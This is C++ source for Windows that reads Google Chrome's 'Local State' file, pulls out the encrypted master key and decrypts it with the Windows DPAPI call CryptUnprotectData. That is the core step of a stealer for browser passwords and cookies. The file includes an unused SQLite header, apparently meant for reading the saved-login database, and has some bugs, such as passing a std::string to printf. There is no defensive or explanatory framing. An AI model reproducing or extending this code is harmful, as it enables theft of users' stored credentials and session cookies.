#include <iostream>
#include <fstream>
#include <string>
#include <limits>
#include <cassert>
#include <windows.h>
#include "sqlite-amalgamation-3340000\sqlite3.h"
using namespace std;

string base64_encode(const string &bindata);
string base64_decode(const string &base64String);

int main(void)
{
	string encodedKeyBase64 = "";
	string encodedKey, decodedKey;
	string stringToFind = "{\"encrypted_key\":\"";
	short caminhaString = 0;
	string baseFilePath = getenv("LOCALAPPDATA");
	string localStateFilePath = baseFilePath + "\\Google\\Chrome\\User Data\\Local State";
	char localStateFileCharacter;
	bool encontrouString = false;
	ifstream localStateFile(localStateFilePath);
	if (!localStateFile.is_open())
		return 1;

	while (localStateFile >> localStateFileCharacter)
	{
		if (localStateFileCharacter == stringToFind[caminhaString])
		{
			caminhaString++;
			if (!stringToFind[caminhaString])
			{
				encontrouString = true;
				break;
			}
		}

		else
			caminhaString = 0;
	}

	if (!encontrouString)
	{
		cout << "NÃ£o encontrou\n";
		localStateFile.close();
		return 1;
	}

	cout << "Encontrou\n";

	while (localStateFile >> localStateFileCharacter)
	{
		if (localStateFileCharacter == '\"')
			break;

		encodedKeyBase64 += localStateFileCharacter;
	}

	localStateFile.close();
	cout << encodedKeyBase64 + '\n';

	encodedKey = base64_decode(encodedKeyBase64);
	cout << base64_decode(encodedKey.substr(5)) + '\n';

	DATA_BLOB DataIn;
	DataIn.cbData = encodedKey.length() - 5;
	DataIn.pbData = new BYTE[encodedKey.length() - 5];
	if (DataIn.pbData == nullptr)
	{
		cout << "Error: memory for byteArray could not be allocated";
		return 1;
	}
	memcpy(DataIn.pbData, encodedKey.substr(5).c_str(), encodedKey.length() - 5);
	DATA_BLOB DataOut;
	LPWSTR pDescrOut = NULL;
	//--------------------------------------------------------------------
	// The buffer DataOut would be created using the CryptProtectData
	// function. If may have been read in from a file.

	//--------------------------------------------------------------------
	//   Begin unprotect phase.

	if (CryptUnprotectData(
			&DataIn,
			&pDescrOut,
			NULL, // Optional entropy
			NULL, // Reserved
			NULL, // Here, the optional
				  // prompt structure is not
				  // used.
			0,
			&DataOut))
	{
		cout << DataOut.cbData << '\n';
		char *tmp = new char[1000];
		memcpy(tmp,DataOut.pbData,DataOut.cbData);
		tmp[DataOut.cbData] = '\0';
		decodedKey = tmp;
		printf("The decrypted data is: %s\n", base64_encode(decodedKey));
		LocalFree(DataOut.pbData);
		delete[] tmp;
	}
	else
	{
		printf("CryptUnprotectData failed: %d\n", 
			GetLastError());
	}
	delete[] DataIn.pbData;
	return 0;
}

static const char b64_table[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char reverse_table[128] = {
   64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
   64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
   64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
   52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
   64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
   15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
   64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
   41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64
};

string base64_encode(const string &bindata)
{

   if (bindata.size() > (numeric_limits<string::size_type>::max() / 4u) * 3u) {
      throw length_error("Converting too large a string to base64.");
   }

   const size_t binlen = bindata.size();
   // Use = signs so the end is properly padded.
   string retval((((binlen + 2) / 3) * 4), '=');
   size_t outpos = 0;
   int bits_collected = 0;
   unsigned int accumulator = 0;
   const string::const_iterator binend = bindata.end();

   for (string::const_iterator i = bindata.begin(); i != binend; ++i) {
      accumulator = (accumulator << 8) | (*i & 0xffu);
      bits_collected += 8;
      while (bits_collected >= 6) {
         bits_collected -= 6;
         retval[outpos++] = b64_table[(accumulator >> bits_collected) & 0x3fu];
      }
   }
   if (bits_collected > 0) { // Any trailing bits that are missing.
      assert(bits_collected < 6);
      accumulator <<= 6 - bits_collected;
      retval[outpos++] = b64_table[accumulator & 0x3fu];
   }
   assert(outpos >= (retval.size() - 2));
   assert(outpos <= retval.size());
   return retval;
}

string base64_decode(const string &base64String)
{
   string retval;
   const string::const_iterator last = base64String.end();
   int bits_collected = 0;
   unsigned int accumulator = 0;

   for (string::const_iterator i = base64String.begin(); i != last; ++i) {
      const int c = *i;
      if (isspace(c) || c == '=') {
         // Skip whitespace and padding. Be liberal in what you accept.
         continue;
      }
      if ((c > 127) || (c < 0) || (reverse_table[c] > 63)) {
         throw invalid_argument("This contains characters not legal in a base64 encoded string.");
      }
      accumulator = (accumulator << 6) | reverse_table[c];
      bits_collected += 6;
      if (bits_collected >= 8) {
         bits_collected -= 8;
         retval += static_cast<char>((accumulator >> bits_collected) & 0xffu);
      }
   }
   return retval;
}